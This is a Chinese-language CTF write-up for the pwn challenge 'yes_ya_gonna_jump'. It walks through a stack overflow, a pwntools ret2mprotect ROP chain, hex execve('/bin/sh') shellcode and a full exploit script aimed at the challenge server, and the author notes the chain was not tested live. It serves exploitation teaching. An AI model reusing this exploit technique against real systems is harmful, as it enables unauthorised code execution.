# Writeup：yes_ya_gonna_jump（Stack Overflow + 無 execve → ret2mprotect + 自寫 shellcode）

> 目標檔案：[yes_ya_gonna_jump](yes_ya_gonna_jump)
> 遠端：`nc ctf.adl.tw 10004`（使用者已確認）
> 分類：Binary Exploitation / pwn
> 用到的程式碼：[disasm.py](disasm.py)（反組譯/找字串/自動組 ROP chain，輸出見 [disasm_output.txt](disasm_output.txt)）、[yes_ya_gonna_jump_solve.py](yes_ya_gonna_jump_solve.py)（最終 exploit）

這題把前面幾題用過的招式都堵住了：**沒有現成的 win function**（`execve`/`system` 這些符號在連結時直接被丟掉），**NX 開著**（不能像 `shellcode` 那題一樣直接塞 shellcode 到 stack 上執行）。解法是把兩種手法疊在一起：先用 ROP 呼叫 `mprotect()` 幫自己開一塊「可執行」的記憶體，再把自己的 shellcode 讀進去、跳過去執行——這就是標題「yes, ya gonna jump」的意思：你得先組一串 ROP gadget，一步一步 **jump** 過去，才能真正拿到執行自己程式碼的機會。

---

## 1. 初步偵查

```bash
file yes_ya_gonna_jump
```
```
yes_ya_gonna_jump: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux),
statically linked, ... not stripped
```

```bash
checksec --file=yes_ya_gonna_jump
```
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found       <- 可疑，見下方說明
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

重點情報：

- **statically linked**：整個 glibc 都被打包進這一個檔案裡，symbol table 動輒上千個函式（`memcpy`、`strcmp`、各種 `_IO_*`…），不像前幾題一眼就能挑出可疑函式——但好處是，**所有 libc 函式的位址也都變成寫死的常數**（不用像動態連結那樣還要 leak libc base）。
- **NX enabled**：堵死了 `shellcode` 那題的招（stack 不能執行）。
- **checksec 顯示 "Canary found"，但這是誤判**：這個提示是 checksec 看到整個檔案裡「有 `__stack_chk_fail` 這個符號」就判定有 canary，但那只是因為 **statically linked 把整個 glibc 塞進來**，`__stack_chk_fail` 本來就會存在於 libc 裡（供其他函式使用），不代表**這題的 `main()` 真的有加 canary 保護**。實際反組譯 `main()` 之後（見下一節）會發現它的 prologue/epilogue 根本沒有 canary 檢查指令——這題的 overflow 一樣不會被偵測。

## 2. 列出 symbol table，但這次方法要變

```python
from pwn import ELF
e = ELF('yes_ya_gonna_jump', checksec=False)
for name, addr in sorted(e.symbols.items(), key=lambda x: x[1]):
    if name:
        print(hex(addr), name)
```

輸出有上千行，幾乎都是 glibc 內部函式（`strcpy`、`malloc`、`_Unwind_*`…），前幾題「掃一遍找奇怪名字」這招在這裡不管用。换個角度，直接找題目自己的進入點：

```
0x4017b5 main
```

以及之後會用到的 libc 函式位址：

```
0x44f2e0 read
0x450020 mprotect   <- 這個很關鍵，是整題的突破口
0x40b6e0 printf
0x4122b0 puts
```

**沒有 `execve`、`system`、`popen`**——因為程式本身從沒呼叫過這些函式，靜態連結時的連結器（像 `--gc-sections`）會把完全沒被用到的函式從最終檔案裡丟掉。這代表前幾題「找 win function 直接 ret 過去」這招，這題行不通。

## 3. 反組譯 `main()`

```asm
0x4017bd: sub rsp, 0x20            ; 整個 stack frame 只有 0x20 (32) bytes
0x4017c1~0x4017d9: 四個 mov [rbp-N], 0   ; 把 buf 清零（跟漏洞無關，單純初始化）

;（中間印 5 句歌詞/台詞）

0x401840: lea rax, [rbp - 0x20]    ; buf 位址
0x401844: mov edx, 0xd0            ; len = 0xd0 (208)
0x401849: mov rsi, rax
0x40184c: mov edi, 0
0x401851: call read                ; read(0, buf, 208)   <-- buf 只有 32 bytes!

0x401856: lea rax, [rbp - 0x20]
0x40185a: mov rsi, rax             ; printf 的第二個參數 = buf
0x40185d: lea rax, [rip+...]       ; "You sang:%sIs this the correct song?\n"
0x401864: mov rdi, rax
0x40186c: call printf              ; printf(fmt, buf)

0x401871: mov eax, 0
0x401876: leave
0x401877: ret                      ; <- 這裡完全沒有 canary 檢查就直接 ret
```

C 虛擬碼：

```c
char buf[0x20];                 // 32 bytes
read(0, buf, 0xd0);             // 最多讀 208 bytes，沒有任何長度檢查
printf("You sang:%sIs this the correct song?\n", buf);
return 0;
```

漏洞非常直接：**`buf` 只有 32 bytes，但 `read()` 允許寫入最多 208 bytes**，而且 `leave; ret` 前完全沒有 `mov rax, fs:0x28` / `xor` / `call __stack_chk_fail` 這類 canary 檢查指令——跟 checksec 的誤判相反，**這裡其實是一個沒有任何保護的 classic stack buffer overflow**，可以直接蓋到 return address。

（`printf(fmt, buf)` 這行雖然用 `%s` 印出 `buf`，但那只是把 `buf` 當字串印出來、遇到第一個 `\x00` 就停，跟 overflow 本身無關——overflow 在前面那行 `read()` 就已經發生了，`printf` 只是順便把我們塞進去的部分資料印出來而已，不影響攻擊。）

## 4. 問題：有洞，但沒有 win function、NX 又開著，怎麼辦？

這題同時擋住了前兩題的路：

- 像 `cheer_for_kotone`/`temari_is_dieting` 那樣直接 ret 到現成的 `execve` win function：**做不到**，因為根本沒有 `execve`/`system` 這類函式被連結進來。
- 像 `shellcode` 那題直接把 shellcode 塞進 stack 執行：**做不到**，因為 `NX enabled`，stack 不可執行。

但我們還有別的武器：**`mprotect()` 這個系統呼叫的 libc 包裝函式，剛好還留在這個靜態連結的檔案裡**（`0x450020`）。`mprotect(addr, len, prot)` 可以在執行期間，**把一塊記憶體的權限改成任何我們想要的組合**，包括 `PROT_EXEC`。

### 攻擊思路（ret2mprotect）

1. 用 overflow 蓋 return address，組一串 ROP chain，讓程式去呼叫：
   `mprotect(某塊記憶體, 長度, PROT_READ|PROT_WRITE|PROT_EXEC)`
   把一塊原本不能執行的記憶體，改成「可讀可寫可執行」。
2. 接著在同一條 ROP chain 裡呼叫 `read(0, 同一塊記憶體, 長度)`，把我們接下來要送的 shellcode **讀進這塊剛剛被解禁的記憶體**。
3. ROP chain 最後一個位址，直接填這塊記憶體的位址——`ret` 一執行，就跳過去，開始執行我們送進去的 shellcode。

要改哪一塊記憶體？因為這題 **No PIE**，`.bss`（全域變數區）的位址是寫死的常數（`e.bss()` 可以直接從檔案算出來），完全不受 ASLR 影響（不像 stack，就算 No PIE，stack 位址本身還是會被核心隨機化）。所以我們選 `.bss` 裡一塊空間當成我們的「可執行沙盒」，整個攻擊不需要 leak 任何位址。

## 5. 用 pwntools 自動組 ROP chain

這題是巨大的靜態連結檔案（含整個 glibc），手動一個一個找 gadget 太累，直接讓 `pwntools` 的 `ROP` 類別自動掃描、自動組：

```python
from pwn import *
context.binary = e = ELF('yes_ya_gonna_jump', checksec=False)

rop = ROP(e)
bss = e.bss(0x800)          # 挑一塊離其他全域變數遠一點的 .bss 位址
page = bss & ~0xfff         # mprotect 要求位址對齊到 4KB page 邊界
rop.mprotect(page, 0x2000, 7)   # 7 = PROT_READ|PROT_WRITE|PROT_EXEC
rop.read(0, page, 0x100)
rop.raw(page)                # 最後 ret 到 page，執行我們接下來送的 shellcode

print(rop.dump())
```

輸出（節錄，完整請見 [disasm_output.txt](disasm_output.txt)）：

```
0x0000: pop rdx; pop rbx; ret
0x0008:            0x7  [arg2] rdx = 7
0x0018: pop rsi; ret
0x0020:       0x2000    [arg1] rsi = 8192
0x0028: pop rdi; ret
0x0030:    0x4c7000     [arg0] rdi = 5009408
0x0038:    mprotect
0x0040: pop rdx; pop rbx; ret
0x0048:         0x100    [arg2] rdx = 256
0x0058: pop rsi; ret
0x0060:    0x4c7000      [arg1] rsi = 5009408
0x0068: pop rdi; ret
0x0070:            0x0   [arg0] rdi = 0
0x0078:    read
0x0080:    0x4c7000      ; ret 到這裡，開始執行我們的 shellcode
```

chain 總長 **136 bytes**。pwntools 自動找到的關鍵 gadget：

| 用途 | 位址 | 指令 |
|---|---|---|
| 設定 `rdi`（第一個參數） | `0x401f1f` | `pop rdi; ret` |
| 設定 `rsi`（第二個參數） | `0x409f8e` | `pop rsi; ret` |
| 設定 `rdx`（第三個參數） | `0x485b2b` | `pop rdx; pop rbx; ret`（多 pop 一個 `rbx` 當填充，不影響結果） |

> ⚠️ **踩坑紀錄**：第一次寫 `disasm.py` 時，只用了 `from pwn import ELF`（沒有執行 `context.binary = e`），結果 `ROP().mprotect()/.read()` 自動組出來的 chain 長度變成完全不對的 44 bytes，而且參數順序整個錯亂（看起來像用 32-bit 的呼叫慣例在組 64-bit 的 chain）。原因是 **pwntools 的 `context.arch` 不會因為你 `ELF()` 開了一個 64-bit 檔案就自動變成 `amd64`**，一定要親自設定 `context.binary = e`（或 `context.arch = 'amd64'`），`ROP` 的自動呼叫組裝邏輯才會用對的暫存器呼叫慣例。這個錯誤**不會跳例外、不會報錯**，只會悄悄組出一條語意完全錯誤、實際執行會直接噴掉的 chain，排查起來特別陰——寫這類 script 時建議養成習慣，一開頭就明確 `context.binary = e`。

## 6. 組最終 Payload

Offset 計算：

```
buf 大小 = 0x20 (32) bytes
saved rbp = 8 bytes
offset = 0x20 + 0x8 = 0x28 (40) bytes，從 buf 起點到 return address
```

```python
OFFSET = 0x28
overflow_payload = b'A' * OFFSET + rop.chain()   # 40 + 136 = 176 bytes，< 208 的上限
```

shellcode 沿用 `shellcode` 那題驗證過的經典 `execve("/bin/sh", NULL, NULL)`（25 bytes）：

```
4831f65648bf2f2f62696e2f7368574889e74831d2b03b0f05
```

### 執行流程

1. 送出 176 bytes 的 `overflow_payload`：`read(0, buf, 0xd0)` 全部吃下去，蓋滿 `buf` + saved rbp，return address 被蓋成 ROP chain 的第一個 gadget。
2. `printf` 印出一些夾雜亂碼的輸出（因為 `buf` 現在裝的是我們的 payload，不是正常歌詞），接著 `leave; ret`，**沒有 canary 檢查**，直接跳進 ROP chain。
3. ROP chain 依序執行：`mprotect(bss_page, 0x2000, 7)` → 這塊 `.bss` 現在可讀可寫可執行了。
4. 緊接著 `read(0, bss_page, 0x100)`——這個新的 `read()` 呼叫會**再等一次輸入**，這時候我們才送出 25 bytes 的 shellcode。
5. ROP chain 最後一步 `ret` 到 `bss_page`，CPU 開始執行我們剛剛送進去、已經變成可執行的 shellcode，執行到 `syscall`（`execve`）拿到 shell。

**關於兩個 `read()` 之間的同步**：第一個 `read()`（在 `main()` 裡）跟第二個 `read()`（ROP chain 裡呼叫的）之間，程式**完全沒有印出任何文字**，沒辦法用 `recvuntil` 卡住等它。這裡用一個小小的 `time.sleep(0.5)` 墊在中間送出 shellcode，確保遠端已經真正執行到第二個 `read()`、開始阻塞等待資料之後，我們的 shellcode 才送達——避免被同一次 `read()` 呼叫把 overflow payload 跟 shellcode 一起吃掉（如果兩批資料在遠端處理第一個 `read()` 之前就已經全部送達並進了同一個 TCP 接收緩衝區，第一個 `read(0,buf,0xd0)` 可能會把還沒輪到的 shellcode bytes 也一次吃光，導致第二個 `read()` 永遠收不到資料、卡死）。

## 7. 完整 Exploit Script

```python
from pwn import *
import time

context.binary = e = ELF('yes_ya_gonna_jump', checksec=False)

HOST, PORT = 'ctf.adl.tw', 10004

BUF_SIZE = 0x20
SAVED_RBP = 0x8
OFFSET = BUF_SIZE + SAVED_RBP

rop = ROP(e)
bss = e.bss(0x800)
page = bss & ~0xfff
rop.mprotect(page, 0x2000, 7)
rop.read(0, page, 0x100)
rop.raw(page)

overflow_payload = b'A' * OFFSET + rop.chain()
shellcode = bytes.fromhex('4831f65648bf2f2f62696e2f7368574889e74831d2b03b0f05')

p = remote(HOST, PORT, timeout=10)

p.recvuntil(b'with me: ')
p.send(overflow_payload)

time.sleep(0.5)
p.send(shellcode)

p.interactive()
```

連線成功拿到 shell 後，同樣手動：

```
find / -iname "*flag*" 2>/dev/null
cat <flag 路徑>
```

> ⚠️ 本機 Windows 環境沒有 WSL/QEMU，無法原生跑這個 Linux ELF，所以整支 ROP chain 的正確性是透過 pwntools 自動分析（確認 gadget 真實存在、確認 `rop.chain()` 長度與語意合理）+ 反組譯交叉驗證得出的結論，尚未實際連線執行驗證過整個流程。

---

## 重點整理

- **漏洞本體**：`read(0, buf, 0xd0)`，`buf` 只有 `0x20`（32）bytes，長度上限 `0xd0`（208）遠大於緩衝區，且 `main()` 完全沒有 canary 檢查，是一個最單純的 stack buffer overflow——跟前幾題比，這題的「漏洞」反而是最直白的，**難點全部在拿到 overflow 之後要怎麼用**。
- **checksec 的 "Canary found" 是 statically linked 常見的假警報**：只要整個 glibc 被打包進檔案，`__stack_chk_fail` 這個符號一定存在，不代表某個特定函式真的有加保護；一定要實際反組譯確認目標函式的 prologue/epilogue，不能只看 checksec 的摘要。
- **沒有 win function 時的進階手法：ret2mprotect**：當題目把 `execve`/`system` 都拿掉、又開了 NX，與其找不存在的函式，不如找「能幫你改權限」的函式（`mprotect`）——先用 ROP 把一塊記憶體（這題選 `.bss`，因為 No PIE 位址固定）改成可執行，再讀入自己的 shellcode 跳過去執行，等於是自己動手補回 `shellcode` 那題被拿掉的能力。
- **大型靜態連結檔案的分析方法要跟著變**：symbol table 爆量時，別想著「掃一遍找奇怪函式」，改成鎖定題目自己的進入點（`main`）和你需要的特定 libc 函式（這題是 `read`/`mprotect`），然後讓 `pwntools` 的 `ROP` 自動幫你掃全部 gadget、自動組呼叫慣例正確的 chain，比手動找 gadget 快非常多。
- **一個容易忽略但會讓你查半天的陷阱**：用 `pwntools` 的 `ROP().func(...)` 自動組 chain 前，一定要先 `context.binary = e`（或手動設 `context.arch`），不然 `context.arch` 不會因為你開了一個 64-bit ELF 就自動變成 `amd64`，組出來的 chain 會悄悄壞掉卻不會報錯。
- **解題思路順序**：`file`/`checksec` 初步偵查（留意 "Canary found" 可能是靜態連結造成的假警報）→ 反組譯 `main()`，確認真正的 overflow 與有沒有 canary 檢查 → 嘗試列 symbol table 找 win function，發現 `execve`/`system` 都不存在 → 注意到 `NX enabled`，排除「直接塞 shellcode 到 stack」這條路 → 發現 `mprotect` 还留在檔案裡，想到 ret2mprotect → 選一塊位址固定的 `.bss` 當沙盒 → 用 `pwntools` 自動組 ROP chain（記得先設 `context.binary`）→ 算 offset、組 payload，注意兩階段 `read()` 之間要有同步機制 → 送出 shellcode、拿 shell、找 flag。
